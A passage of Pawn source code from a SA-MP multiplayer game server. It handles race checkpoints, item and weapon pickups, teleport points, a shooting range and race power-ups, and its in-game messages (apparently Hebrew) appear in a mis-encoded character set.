							if(playerinfo[i][dplace] == 1) SetPlayerRaceCheckpoint(i,0,DriftPositions_1[playerinfo[i][driftcp]][0],DriftPositions_1[playerinfo[i][driftcp]][1],DriftPositions_1[playerinfo[i][driftcp]][2],DriftPositions_1[playerinfo[i][driftcp]+1][0],DriftPositions_1[playerinfo[i][driftcp]+1][1],DriftPositions_1[playerinfo[i][driftcp]+1][2],11.5);
							else if(playerinfo[i][dplace] == 2) SetPlayerRaceCheckpoint(i,0,DriftPositions_2[playerinfo[i][driftcp]][0],DriftPositions_2[playerinfo[i][driftcp]][1],DriftPositions_2[playerinfo[i][driftcp]][2],DriftPositions_2[playerinfo[i][driftcp]+1][0],DriftPositions_2[playerinfo[i][driftcp]+1][1],DriftPositions_2[playerinfo[i][driftcp]+1][2],11.5);
							else if(playerinfo[i][dplace] == 3) SetPlayerRaceCheckpoint(i,0,DriftPositions_3[playerinfo[i][driftcp]][0],DriftPositions_3[playerinfo[i][driftcp]][1],DriftPositions_3[playerinfo[i][driftcp]][2],DriftPositions_3[playerinfo[i][driftcp]+1][0],DriftPositions_3[playerinfo[i][driftcp]+1][1],DriftPositions_3[playerinfo[i][driftcp]+1][2],11.5);
							playerinfo[i][driftcp]++;
						}
					}
				}
			}
			if(win)
			{
				GiveMoney(playerid,playerinfo[playerid][bet],2);
				format(string,sizeof(string)," Х !су°щЇш %s ЁщЎч р· %s",GetName(playerinfo[playerid][dinvited]),GetName(playerid));
				SendClientMessageToAll(orange,string);
				playerinfo[playerinfo[playerid][dinvited]][driftcp] = 0,
				playerinfo[playerinfo[playerid][dinvited]][indrift] = 0,
				playerinfo[playerinfo[playerid][dinvited]][bet] = 0,
				playerinfo[playerinfo[playerid][dinvited]][dinviter] = 0,
				playerinfo[playerinfo[playerid][dinvited]][dinvited] = -1;
				playerinfo[playerid][driftcp] = 0,
				playerinfo[playerid][indrift] = 0,
				playerinfo[playerid][bet] = 0,
				playerinfo[playerid][dinviter] = 0,
				playerinfo[playerid][dinvited] = -1;
			}
		}
	}
	if(playerinfo[playerid][inprace])
	{
		new bool:win=false;
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && (i == playerid || i == playerinfo[playerid][prinvited]))
			{
				DisablePlayerRaceCheckpoint(i);
				new size = 0;
				if(playerinfo[i][prplace] == 1) size = sizeof(PRacePositions_1);
				else if(playerinfo[i][prplace] == 2) size = sizeof(PRacePositions_2);
				else if(playerinfo[i][prplace] == 3) size = sizeof(PRacePositions_3);
				if(playerinfo[i][pracecp] == (size-1))
				{
					SetPlayerVirtualWorld(i,world_normal);
					SetVehicleVirtualWorld(GetPlayerVehicleID(i),world_normal);
					DisablePlayerRaceCheckpoint(i);
					win = true;
				}
				else if(playerinfo[i][pracecp] == (size-2))
				{
					if(playerinfo[i][prplace] == 1) SetPlayerRaceCheckpoint(i,1,PRacePositions_1[playerinfo[i][pracecp]][0],PRacePositions_1[playerinfo[i][pracecp]][1],PRacePositions_1[playerinfo[i][pracecp]][2],PRacePositions_1[playerinfo[i][pracecp]][0],PRacePositions_1[playerinfo[i][pracecp]][1],PRacePositions_1[playerinfo[i][pracecp]][2],14.5);
					else if(playerinfo[i][prplace] == 2) SetPlayerRaceCheckpoint(i,1,PRacePositions_2[playerinfo[i][pracecp]][0],PRacePositions_2[playerinfo[i][pracecp]][1],PRacePositions_2[playerinfo[i][pracecp]][2],PRacePositions_2[playerinfo[i][pracecp]][0],PRacePositions_2[playerinfo[i][pracecp]][1],PRacePositions_2[playerinfo[i][pracecp]][2],14.5);
					else if(playerinfo[i][prplace] == 3) SetPlayerRaceCheckpoint(i,1,PRacePositions_3[playerinfo[i][pracecp]][0],PRacePositions_3[playerinfo[i][pracecp]][1],PRacePositions_3[playerinfo[i][pracecp]][2],PRacePositions_3[playerinfo[i][pracecp]][0],PRacePositions_3[playerinfo[i][pracecp]][1],PRacePositions_3[playerinfo[i][pracecp]][2],14.5);
					playerinfo[i][pracecp]++;
				}
				else
				{
					if(playerinfo[i][prplace] == 1) SetPlayerRaceCheckpoint(i,0,PRacePositions_1[playerinfo[i][pracecp]][0],PRacePositions_1[playerinfo[i][pracecp]][1],PRacePositions_1[playerinfo[i][pracecp]][2],PRacePositions_1[playerinfo[i][pracecp]+1][0],PRacePositions_1[playerinfo[i][pracecp]+1][1],PRacePositions_1[playerinfo[i][pracecp]+1][2],14.5);
					else if(playerinfo[i][prplace] == 2) SetPlayerRaceCheckpoint(i,0,PRacePositions_2[playerinfo[i][pracecp]][0],PRacePositions_2[playerinfo[i][pracecp]][1],PRacePositions_2[playerinfo[i][pracecp]][2],PRacePositions_2[playerinfo[i][pracecp]+1][0],PRacePositions_2[playerinfo[i][pracecp]+1][1],PRacePositions_2[playerinfo[i][pracecp]+1][2],14.5);
					else if(playerinfo[i][prplace] == 3) SetPlayerRaceCheckpoint(i,0,PRacePositions_3[playerinfo[i][pracecp]][0],PRacePositions_3[playerinfo[i][pracecp]][1],PRacePositions_3[playerinfo[i][pracecp]][2],PRacePositions_3[playerinfo[i][pracecp]+1][0],PRacePositions_3[playerinfo[i][pracecp]+1][1],PRacePositions_3[playerinfo[i][pracecp]+1][2],14.5);
					playerinfo[i][pracecp]++;
				}
			}
		}
		if(win)
		{
			format(string,sizeof(string)," Х !сющ°хї %s ЁщЎч р· %s",GetName(playerinfo[playerid][prinvited]),GetName(playerid));
			SendClientMessageToAll(orange,string);
			playerinfo[playerinfo[playerid][prinvited]][pracecp] = 0,
			playerinfo[playerinfo[playerid][prinvited]][inprace] = 0,
			playerinfo[playerinfo[playerid][prinvited]][prinviter] = 0,
			playerinfo[playerinfo[playerid][prinvited]][prinvited] = -1;
			playerinfo[playerid][pracecp] = 0,
			playerinfo[playerid][inprace] = 0,
			playerinfo[playerid][prinviter] = 0,
			playerinfo[playerid][prinvited] = -1;
		}
	}
	#if lagtest
		LagTest_End("OnPlayerEnterRaceCheckpoint");
	#endif
	if(debugstate) printf("OnPlayerEnterRaceCheckpoint(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[OnPlayerLeaveRaceCheckpoint]================================================
public OnPlayerLeaveRaceCheckpoint(playerid)
{
	if(debugstate) printf("OnPlayerLeaveRaceCheckpoint(%s(%d)) start",GetName(playerid),playerid);
	Streamer_CallbackHook(STREAMER_OPLRC,playerid);
	if(debugstate) printf("OnPlayerLeaveRaceCheckpoint(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[OnPlayerPickUpPickup]=======================================================
public OnPlayerPickUpPickup(playerid, pickupid)
{
	if(debugstate) printf("OnPlayerPickUpPickup(%s(%d),%d) start",GetName(playerid),playerid,pickupid);
	#if lagtest
		LagTest_Start("OnPlayerPickUpPickup");
	#endif
	#if hanukkah_now
	if(pickupid == hanpickup) // ьўщч· ёхЇтЁщф
	{
	    if(!playerinfo[playerid][logged]) return SendClientMessage(playerid, red, " .Єьщъ ьфщх· °∙хэ Єь юЁ· ьрёхє ёхЇтЁщх·");
	    if(playerinfo[playerid][donuttime])
	    {
			new str[M_S];
			if(playerinfo[playerid][donuttime] < 60) return SendClientMessage(playerid, red, " .Єьщъ ьфю·щя Єху уўф");
			format(str, sizeof(str), " .Єьщъ ьфю·щя Єху %d уўх·", 1 + (playerinfo[playerid][donuttime] / 60));
			return SendClientMessage(playerid, red, str);
	    }
	    donut_give(playerid, 1);
	    playerinfo[playerid][donuttime] = 900;
		fsetint(fuser(playerid), "donut_time", 900);
	    SendClientMessage(playerid, green, " !ўщсь· ёхЇтЁщф");
	    SendClientMessage(playerid, green, " /donutshop - чЁх· фёхЇтЁщх·");
	}
	#endif
	/*if(pickupid == prizesypickup)
 	{
		if(prizesys == true)
		{
			new string[M_S];
			new prizestring[M_S];
		    if(prizesystype == 1) prizestring = " .ьўч р· ффЇ·Єф, хцыф с30,000$", GiveMoney(playerid,30000);
		    if(prizesystype == 2) prizestring = " .ьўч р· ффЇ·Єф, хцыф с15 ыух°щ сцхўф", GiveWeapon(playerid,35,15);
		    if(prizesystype == 3) prizestring = " .ьўч р· ффЇ·Єф, хцыф с°ыс ющхчу юёхт: юёхўхя",fsetint(fuser(playerid),"PVehicle3",464),fsetint(fuser(playerid),"Vehicle3Cost",8500000),playerinfo[playerid][vehicle][5] = fgetint(fuser(playerid),"PVehicle3");
	        if(prizesystype == 4) prizestring = " .ьўч р· ффЇ·Єф, хцыф с°ыс ющхчу юёхт: ыщёр тьтьщэ",fsetint(fuser(playerid),"PVehicle3",509),fsetint(fuser(playerid),"Vehicle3Cost",5000000),playerinfo[playerid][vehicle][5] = fgetint(fuser(playerid),"PVehicle3");
	        if(prizesystype == 5) prizestring = " .ьўч р· ффЇ·Єф, хцыф с°ыс ющхчу юёхт: Єть· ёхЇ°",fsetint(fuser(playerid),"PVehicle3",481),fsetint(fuser(playerid),"Vehicle3Cost",5000000),playerinfo[playerid][vehicle][5] = fgetint(fuser(playerid),"PVehicle3");
	        if(prizesystype == 6) prizestring = " .ьўч р· ффЇ·Єф, хцыф счу° сшщэёЇщў ь∙схЄ",SendClientMessage(playerid,green," .цыщ· счу° сшщэёЇщў ь∙схЄ, ЇЁф ьрчу ючс°щ фЁфь· ф∙°· фюрхчу ьўсь· фЇ°ё");
	        if(prizesystype == 7) prizestring = " .ьўч р· ффЇ·Єф, хцыф с·рт сЇх°хэ ь∙схЄ",SendClientMessage(playerid,green," .ьўсь· фЇ°ё SAMP-IL цыщ· с·рт сЇх°хэ ь∙схЄ, ЇЁф ьрчу ючс°щ фЁфь· ");
			if(prizesystype == 8) prizestring = " .Sultan :ьўч р· ффЇ·Єф хцыф с°ыс °тщь юёхт",fsetint(fuser(playerid),"PVehicle",560),fsetint(fuser(playerid),"VehicleCost",820000),playerinfo[playerid][vehicle][0] = fgetint(fuser(playerid),"PVehicle");
			if(prizesystype == 9) prizestring = " .ьўч р· ффЇ·Єф, хцыф с∙щЁхщ ·рт",ShowPlayerDialog(playerid,dialog_tagchange,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ ·рт",@c(green) ".сч° ·рт чу∙ ∙·ўсь сцых· ффЇ·Єф\n\n(ьчї ∙щЁхщ ьЄ°щы· ф·рт (°∙хэ с∙уф фы·щсф ·х рчу рх Їчх· ьфё°· ·рт ўщщэ\nьчї сщшхь ыущ ьф∙рщ° р· ф·рт ььр ∙щЁхщ","∙щЁхщ","сщшхь");
			format(string,sizeof(string)," Х !" @c(yellow) "%s" @c(orange)" %s",prizestring,GetName(playerid));
			SendClientMessageToAll(orange,string);
			DestroyPickup(prizesypickup);
			prizesys = false;
		}
  	}*/
	Streamer_CallbackHook(STREAMER_OPPP,playerid,pickupid);
    playerinfo[playerid][pickupteleporting] ++;
	if(playerinfo[playerid][pickupteleporting] > 150)
	{
		SetKick(playerid,INVALID_PLAYER_ID,"Pickup Teleporting");
		return 1;
	}
	if(playerinfo[playerid][pickup] == -1)
	{
		playerinfo[playerid][pickup] = pickupid;
		OnPlayerEnterPickup(playerid,pickupid);
	}
	switch(pickupinfo[pickupid][pmodel])
	{
		case 1240:
		{
			playerinfo[playerid][phealth] = 100.0;
			GameTextForPlayer(playerid,"~g~health",1500,6);
		}
		case 1242:
		{
			playerinfo[playerid][parmour] = 100.0;
			GameTextForPlayer(playerid,"~y~armour",1500,6);
		}
		case 370:
		{
			playerinfo[playerid][jetpack] = 1;
			GameTextForPlayer(playerid,"~b~jetpack",1500,6);
		}
		case 331, 333..339, 321..326, 341..353, 355..369, 371, 372:
		{
			if(pickupinfo[pickupid][pmodel] == 331) GiveWeapon(playerid,1,1,0);
			else if(pickupinfo[pickupid][pmodel] == 333) GiveWeapon(playerid,2,1,0);
			else if(pickupinfo[pickupid][pmodel] == 334) GiveWeapon(playerid,3,1,0);
			else if(pickupinfo[pickupid][pmodel] == 335) GiveWeapon(playerid,4,1,0);
			else if(pickupinfo[pickupid][pmodel] == 336) GiveWeapon(playerid,5,1,0);
			else if(pickupinfo[pickupid][pmodel] == 337) GiveWeapon(playerid,6,1,0);
			else if(pickupinfo[pickupid][pmodel] == 338) GiveWeapon(playerid,7,1,0);
			else if(pickupinfo[pickupid][pmodel] == 339) GiveWeapon(playerid,8,1,0);
			else if(pickupinfo[pickupid][pmodel] == 321) GiveWeapon(playerid,10,1,0);
			else if(pickupinfo[pickupid][pmodel] == 322) GiveWeapon(playerid,11,1,0);
			else if(pickupinfo[pickupid][pmodel] == 323) GiveWeapon(playerid,12,1,0);
			else if(pickupinfo[pickupid][pmodel] == 324) GiveWeapon(playerid,13,1,0);
			else if(pickupinfo[pickupid][pmodel] == 325) GiveWeapon(playerid,14,1,0);
   			else if(pickupinfo[pickupid][pmodel] == 326) GiveWeapon(playerid,15,1,0);
   			else if(pickupinfo[pickupid][pmodel] == 341) GiveWeapon(playerid,9,1,0);
   			else if(pickupinfo[pickupid][pmodel] == 342) GiveWeapon(playerid,16,8,0);
   			else if(pickupinfo[pickupid][pmodel] == 343) GiveWeapon(playerid,17,8,0);
   			else if(pickupinfo[pickupid][pmodel] == 344) GiveWeapon(playerid,18,8,0);
   			else if(pickupinfo[pickupid][pmodel] == 346) GiveWeapon(playerid,22,30,0);
   			else if(pickupinfo[pickupid][pmodel] == 347) GiveWeapon(playerid,23,10,0);
   			else if(pickupinfo[pickupid][pmodel] == 348) GiveWeapon(playerid,24,10,0);
   			else if(pickupinfo[pickupid][pmodel] == 349) GiveWeapon(playerid,25,15,0);
   			else if(pickupinfo[pickupid][pmodel] == 350) GiveWeapon(playerid,26,10,0);
   			else if(pickupinfo[pickupid][pmodel] == 351) GiveWeapon(playerid,27,10,0);
   			else if(pickupinfo[pickupid][pmodel] == 352) GiveWeapon(playerid,28,60,0);
   			else if(pickupinfo[pickupid][pmodel] == 353) GiveWeapon(playerid,29,60,0);
   			else if(pickupinfo[pickupid][pmodel] == 355) GiveWeapon(playerid,30,80,0);
   			else if(pickupinfo[pickupid][pmodel] == 356) GiveWeapon(playerid,31,80,0);
   			else if(pickupinfo[pickupid][pmodel] == 357) GiveWeapon(playerid,33,20,0);
   			else if(pickupinfo[pickupid][pmodel] == 358) GiveWeapon(playerid,34,10,0);
   			else if(pickupinfo[pickupid][pmodel] == 359) GiveWeapon(playerid,35,4,0);
   			else if(pickupinfo[pickupid][pmodel] == 360) GiveWeapon(playerid,36,3,0);
   			else if(pickupinfo[pickupid][pmodel] == 361) GiveWeapon(playerid,37,100,0);
   			else if(pickupinfo[pickupid][pmodel] == 362) GiveWeapon(playerid,38,500,0);
   			else if(pickupinfo[pickupid][pmodel] == 363) GiveWeapon(playerid,39,5,0);
   			else if(pickupinfo[pickupid][pmodel] == 364) GiveWeapon(playerid,40,0,0);
   			else if(pickupinfo[pickupid][pmodel] == 365) GiveWeapon(playerid,41,500,0);
   			else if(pickupinfo[pickupid][pmodel] == 366) GiveWeapon(playerid,42,500,0);
   			else if(pickupinfo[pickupid][pmodel] == 367) GiveWeapon(playerid,43,36,0);
   			else if(pickupinfo[pickupid][pmodel] == 368) GiveWeapon(playerid,44,1,0);
   			else if(pickupinfo[pickupid][pmodel] == 369) GiveWeapon(playerid,45,1,0);
   			else if(pickupinfo[pickupid][pmodel] == 371) GiveWeapon(playerid,46,1,0);
   			else if(pickupinfo[pickupid][pmodel] == 372) GiveWeapon(playerid,32,60,0);
			GameTextForPlayer(playerid,"~r~weapon",1500,6);
			playerinfo[playerid][dontwac] = 1;
		}
	}
	if(specialActivity == sa_ftt && FTTPickup == pickupid) EndFTT(playerid);
	if(playerinfo[playerid][spweapon] != spw_none)
	{
	    SendClientMessage(playerid,red," .ьр Ёщ·я ьф°щэ ЇщўрЇщэ ∙ы∙р·ф Єэ Ё∙ў ющхчу. фЁ∙ў фющхчу рхЇё");
	    DropSPW(playerid);
	}
	#if lagtest
		LagTest_End("OnPlayerPickUpPickup");
	#endif
	if(debugstate) printf("OnPlayerPickUpPickup(%s(%d),%d) end",GetName(playerid),playerid,pickupid);
	return 1;
}
//=[OnPlayerEnterPickup]========================================================
public OnPlayerEnterPickup(playerid,pickupid)
{
	//new str2[128];
	//format(str2, 128, "Pickupid: %d | PFunc: %d", pickupid, pickupinfo[pickupid][pfunc]);
	//SendClientMessageToAll(green, str2);
	if(pickupinfo[pickupid][pfunc] >= 1 && pickupinfo[pickupid][pvalid])
	{
		PlaySound(playerid,1050);
		new string[M_S];
		switch(pickupinfo[pickupid][pfunc])
		{
			case 1:
			{
				playerinfo[playerid][propertyid] = pickupinfo[pickupid][pspecialid];
				if(playerinfo[playerid][propertyid] != -1) playerinfo[playerid][showprop] = 1;
			}
			case 2:
			{
				format(string,sizeof(string)," ╗ :с°хыщэ фсрщэ ьЁўху· фющуЄ ∙ь " @c(lightpurple) "%s",ipinfo[pickupinfo[pickupid][pspecialid]][ipheader]);
				SendClientMessage(playerid,purple,string);
				SendClientMessage(playerid,orange," Х ьў°щр· ющуЄ ~k~~PED_SPRINT~ ьчї");
			}
			case 3..6:
			{
				new v = GetPlayerVehicleID(playerid);
				switch(pickupinfo[pickupid][pfunc]-3)
				{
					case vp_repair:
					{
						RepairVehicle(v);
						SetPlayerHealth(playerid,100.0);
						GameTextForPlayer(playerid,"~g~~h~repair!",1500,4);
					}
					case vp_nitro:
					{
						UpdateNitro(v,playerid);
						GameTextForPlayer(playerid,"~b~nitro!",1500,4);
					}
					case vp_replace:
					{
						ReplaceVehicle(playerid,pickupinfo[pickupid][pspecialid]);
						format(string,sizeof(string),"~y~%s",GetVehicleName(pickupinfo[pickupid][pspecialid]));
						GameTextForPlayer(playerid,string,1500,4);
					}
					case vp_turbo:
					{
						SetVehicleForwardVelocity(v,3.0,0.0);
						GameTextForPlayer(playerid,"~r~turbo!",1500,4);
					}
				}
				PlaySound(playerid,1133);
			}
			case 8:
			{
			    playerinfo[playerid][houseid] = pickupinfo[pickupid][pspecialid];
			    if(playerinfo[playerid][houseid] != -1) playerinfo[playerid][showhouse] = 1;
			}
			case 9:
			{
				playerinfo[playerid][hell] = 1;
				SetPlayerPos(playerid,-2194.7830,-1782.5994,465.0027);
				SetPlayerCheckpoint(playerid,-2194.7830,-1782.5994,315.9093,5.0);
				SendClientMessage(playerid,red," !ЁыЁё· ь∙Є° ьтщфщЁхэ! р·ф Єхюу ьюх·!!! ·хыь ьфЁЎь рэ ·∙·т° ыюф ∙щх·° юф°");
			}
			case 10:
			{
				SetPlayerPos(playerid,-742.0856,492.9158,1371.9766);
				SetPlayerFacingAngle(playerid,242.0343);
				SetPlayerInterior(playerid,1);
				SendClientMessage(playerid,lightblue," ~~~ :Liberty City ,GTA3 с°хыщэ фсрщэ ьЄщ° ∙ь ~~~");
				SendClientMessage(playerid,green," .GTA фЄщ° ∙ьЇЁщщъ фщр фЄщ° ∙фхЇщЄф сю∙чў ф∙ьщ∙щ сёу°·");
				SendClientMessage(playerid,green," /LC ыущ ьфыЁё ьюсЁф (юёЄуф) ∙сЄщ°, ьщуъ, ф∙·ю∙ сЇўхуф");
				SendClientMessage(playerid,red," .∙щэ ьс! сЄщ° фцх ўщщющэ сртщэ хьр Ёщ·я ььы· сыь юўхэ, сюўхюх· юёхщщющэ рЇ∙° ьЄсх° у°ъ ўщ°х· хьщЇхь");
				SendClientMessage(playerid,red," .сющуф хЁЇь· ·хыь Ї∙хш ьф∙·т° ьюўхэ ыь∙фх");
			}
			case 11:
			{
				new pc = pickupinfo[pickupid][pspecialid];
				format(string,sizeof(string),playerinfo[playerid][clan] == pc ? (" .(%s) ЇщўрЇ цф ∙щщъ ьўьря ∙ьъ") : (" .%s ЇщўрЇ цф ∙щщъ ьўьря"),claninfo[pc][cname]);
				SendClientMessage(playerid,yellow,string);
				if(claninfo[pc][csystems][clansys_lockpick] && claninfo[pc][csystemparam][clansys_lockpick] && playerinfo[playerid][clan] != pc)
				{
					SendClientMessage(playerid,yellow," :сюЇўу· фўьря ЇхЄь· юЄ°ы· фтЁф Єь ЇщўрЇщ фўьря");
					new bool:boom = false;
					if(!playerinfo[playerid][clan]) boom = true;
					if(!boom)
					{
						if(claninfo[playerinfo[playerid][clan]][cpeace][pc]) SendClientMessage(playerid,green," .юрч° хфўьря ∙ьъ с∙ьхэ Єэ фўьря фцф, р·ф щыхь ьф∙·ю∙ сЇщўрЇ");
						else if(claninfo[pc][cruler] == playerinfo[playerid][clan]) SendClientMessage(playerid,green," .юрч° хфўьря ∙ьъ ∙хьш сюЇўуф фцх, р·ф щыхь ьф∙·ю∙ сЇщўрЇ");
						else boom = true;
					}
					if(boom)
					{
						SendClientMessage(playerid,red," !ф·ЇхЎЎ· Єь ф∙щюх∙ сЇщўрЇ юхтя");
						new Float:p[3];
						GetPlayerPos(playerid,p[0],p[1],p[2]);
						CreateExplosionVW(p[0],p[1],p[2],12,7.5,world_normal);
					}
				}
			}
			case 12:
			{
				SetPlayerPos(playerid,298.3959,-74.4127,1001.5156);
				SetPlayerFacingAngle(playerid,359.0325);
				SetCameraBehindPlayer(playerid);
				SendClientMessage(playerid,blue," .с°хыщэ фсрщэ ьюшххч! р·ф юхцюя ьсчх° Ё∙ў");
			}
			case 13:
			{
				SetPlayerPos(playerid,301.5105,-78.8933,1001.5156);
				SetPlayerFacingAngle(playerid,88.2607);
				SetCameraBehindPlayer(playerid);
				SetPlayerVirtualWorld(playerid,world_normal);
				playerinfo[playerid][srin] = 0;
				ResetWeapons(playerid);
				LoadPlayerWeapons(playerid);
				if(playerinfo[playerid][srstarted])
				{
					StopShootingRange(playerid);
					SendClientMessage(playerid,blue," .фЇёў· р· фюшххч хщЎр· ююЁх");
				}
			}
			case 14..21: if(!playerinfo[playerid][srin])
			{
				playerinfo[playerid][srin] = 1;
				new wpns[] = {22,24,25,26,27,29,31,34}, wr = GetEmptyWorld(), we = wpns[pickupinfo[pickupid][pfunc]-14], head[32];
				playerinfo[playerid][srweapon] = we;
				SetPlayerVirtualWorld(playerid,wr);
				SavePlayerWeapons(playerid);
				ResetWeapons(playerid);
				GiveWeapon(playerid,we,10000);
				format(head,sizeof(head),@c(lightblue) "\"%s\" юшххч сЁ∙ў",WeaponName(we));
				format(string,sizeof(string),@c(yellow) ".·хыь ьф·чщь ыЄ· ьф·рюя Єь Ё∙ў цф сюЄ°ы· фюшххч ∙ь ф∙°·");
				format(string,sizeof(string),"%s\n\n/SRStart :ьф·чь· фюшххч",string);
				format(string,sizeof(string),"%s\n/SRStop :ьфЇёў· фюшххч",string);
				format(string,sizeof(string),"%s\n/SRLevel [1-3] :ьсчщ°· °ю· фўх∙щ",string);
				format(string,sizeof(string),"%s\n\n" @c(green)"╗ !сфЎьчф",string);
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,head,string,"OK","");
				playerinfo[playerid][srlevel] = 1;
			}
			case 22:
			{
				new pos = CountOfSRaceTypeInArray(2,0) + CountOfSRaceTypeInArray(2,1);
				playerinfo[playerid][sracecp] = pos;
				SetPlayerRaceCheckpoint(playerid,3,SRacePositions_2[playerinfo[playerid][sracecp]][srX],SRacePositions_2[playerinfo[playerid][sracecp]][srY],SRacePositions_2[playerinfo[playerid][sracecp]][srZ],SRacePositions_2[playerinfo[playerid][sracecp]+1][srX],SRacePositions_2[playerinfo[playerid][sracecp]+1][srY],SRacePositions_2[playerinfo[playerid][sracecp]+1][srZ],7.0);
				SetPlayerPos(playerid,SRacePositions_2[pos][srX],SRacePositions_2[pos][srY],SRacePositions_2[pos][srZ]);
				SetPlayerFacingAngle(playerid,SRacePositions_2[pos][srA]);
				SetPlayerAttachedObject(playerid,aoslot_underwater,18844,2,0.0,0.0,0.0,0.0,0.0,0.0,0.005,0.005,0.005);
				format(string,sizeof(string)," ~ !сч° ььы· ю·ч· ьющэ %s",GetName(playerid));
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inact] && playerinfo[i][insrace]) SendClientMessage(i,lightblue,string);
				SetPlayerVirtualWorld(playerid,world_waterace);
			}
			case 23:
			{
				new pos = CountOfSRaceTypeInArray(2,0) + CountOfSRaceTypeInArray(2,1) + CountOfSRaceTypeInArray(2,2);
				playerinfo[playerid][sracecp] = pos;
				SetPlayerRaceCheckpoint(playerid,3,SRacePositions_2[playerinfo[playerid][sracecp]][srX],SRacePositions_2[playerinfo[playerid][sracecp]][srY],SRacePositions_2[playerinfo[playerid][sracecp]][srZ],SRacePositions_2[playerinfo[playerid][sracecp]+1][srX],SRacePositions_2[playerinfo[playerid][sracecp]+1][srY],SRacePositions_2[playerinfo[playerid][sracecp]+1][srZ],7.0);
				SetPlayerPos(playerid,SRacePositions_2[pos][srX],SRacePositions_2[pos][srY],SRacePositions_2[pos][srZ]);
				SetPlayerFacingAngle(playerid,SRacePositions_2[pos][srA]);
				ToggleWaterWalk(playerid,1);
				format(string,sizeof(string)," ~ !сч° ььы· юЄь ьющэ %s",GetName(playerid));
				for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inact] && playerinfo[i][insrace]) SendClientMessage(i,lightblue,string);
				SetPlayerVirtualWorld(playerid,world_waterace);
			}
			case 24:
			{
				if(playerinfo[playerid][tooktempickup]) SendClientMessage(playerid,red," .ыс° ЇЄщь рЎьъ ЇщўрЇ ∙ьўч· сЇЄщьх·, фЇщўрЇ ∙ьўч· ы°тЄ ьр щ∙ЇщЄ");
				else
				{
					new v = kartinfo[0] ? playerinfo[playerid][kartv] : playerinfo[playerid][monsterv], pt = pickupinfo[pickupid][pspecialid];
					while(pt == 11) pt = random(sizeof(TemporaryActivityPickups)-(kartinfo[0] ? 2 : 0));
					switch(pt)
					{
					    case 0..2: // Vehicle Repair
					    {
							new Float:vh, Float:addhp = float(pickupinfo[pickupid][pspecialid]) * 50.0;
							GetVehicleHealth(v,vh);
							SetVehicleHealth(v,floatadd(vh,addhp) >= 999.0 ? 1000.0 : floatadd(vh,addhp));
							PlaySound(playerid,1133);
							format(string, sizeof(string), "~g~+~b~%.0f ~g~health", floatdiv(addhp,10.0));
							GameTextForPlayer(playerid, string ,1500,4);
						}
						case 3: // More Speed
						{
							GameTextForPlayer(playerid,"~g~speed up!~n~~b~(5 seconds)",1500,4);
							playerinfo[playerid][speedup][0] = 1.2,
							playerinfo[playerid][speedup][1] = 1.2,
							playerinfo[playerid][speedup][2] = 1.0,
							playerinfo[playerid][tooktempickup] = 1;
							SetTimerEx("RemovePlayerTempPickup",5000,0,"iifi",playerid,v,-1.0,0);
						}
						case 4: // More Speed (X2)
						{
							GameTextForPlayer(playerid,"~g~speed up ~r~(extra)~g~!~n~~b~(8 seconds)",1500,4);
							playerinfo[playerid][speedup][0] = 1.4,
							playerinfo[playerid][speedup][1] = 1.4,
							playerinfo[playerid][speedup][2] = 1.0,
							playerinfo[playerid][tooktempickup] = 1;
							SetTimerEx("RemovePlayerTempPickup",8000,0,"iifi",playerid,v,-1.0,0);
						}
						case 5: // Less Speed
						{
							GameTextForPlayer(playerid,"~r~slow!~n~~b~(5 seconds)",1500,4);
							playerinfo[playerid][speedup][0] = -0.6,
							playerinfo[playerid][speedup][1] = -0.6,
							playerinfo[playerid][speedup][2] = 1.0,
							playerinfo[playerid][tooktempickup] = 1;
							SetTimerEx("RemovePlayerTempPickup",5000,0,"iifi",playerid,v,-1.0,0);
						}
						case 6: // Godmod
						{
							GameTextForPlayer(playerid,"~g~godmod!~n~~b~(5 seconds)",1500,4);
							new Float:vh;
							GetVehicleHealth(v,vh);
							playerinfo[playerid][tooktempickup] = 1,
							vehicleinfo[v][vgm] = 1;
							SetVehicleHealth(v,10000.0);
							SetTimerEx("RemovePlayerTempPickup",5000,0,"iifi",playerid,v,vh,0);
						}
						case 7: // Freeze Time
						{
							for(new x; x < MAX_PLAYERS_; x++) if(IsPlayerConnected(x) && playerinfo[x][inact] && x != playerid)
							{
								GameTextForPlayer(x, "~r~freeze time!", 2000, 4);
								SetFreeze(x, 1);
							}
							playerinfo[playerid][tooktempickup] = 1;
							GameTextForPlayer(playerid, "~g~freeze time!", 2000, 4);
							SetTimerEx("RemovePlayerTempPickup",2000,0,"iifi",playerid,v,1000.0,1);
						}
						case 8: // Kill
						{
							GameTextForPlayer(playerid,"~r~kill!",1500,4);
							SetVehicleHealth(v,0.0);
						}
						case 9: // Explode
						{
							GameTextForPlayer(playerid,"~r~explode!",1500,4);
							new Float:x, Float:y, Float:z;
							GetVehiclePos(playerid, x, y, z);
							CreateExplosion(x, y, z, 6, 0.0);
						}
						case 10: // No Engine
						{
						    playerinfo[playerid][tooktempickup] = 1;
						    GameTextForPlayer(playerid,"~r~no engine!",1500,4);
						    new engine, lights, alarm, doors, bonnet, boot, objectiv, vehicleid;
						    for(new x; x < MAX_PLAYERS_; x++) if(IsPlayerConnected(x) && playerinfo[x][inact] && playerid != x)
						    {
						        vehicleid = GetPlayerVehicleID(x);
								GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objectiv);
								SetVehicleParamsEx(vehicleid, VEHICLE_PARAMS_OFF, lights, alarm, doors, bonnet, boot, objectiv);
							}
							SetTimerEx("RemovePlayerTempPickup",4000,0,"iifi",playerid,v,1000.0,2);
						}
						case 12: // Dumper
						{
							GameTextForPlayer(playerid,"~g~dumper!",1500,4);
							new Float:p[4];
							GetVehiclePos(v,p[0],p[1],p[2]);
							GetVehicleZAngle(v,p[3]);
							DestroyVehicle(v);
							playerinfo[playerid][monsterv] = CreateVehicleEx(406,p[0],p[1],p[2],p[3],-1,-1,respawntime,15,world_monster);
							PutPlayerInVehicle(playerid,playerinfo[playerid][monsterv],0);
						}
					}
					format(string,sizeof(string)," Х !" @c(blue) "%s" @c(green) " ўщсь· ЇщўрЇ",TemporaryActivityPickups[pickupinfo[pickupid][pspecialid]]);
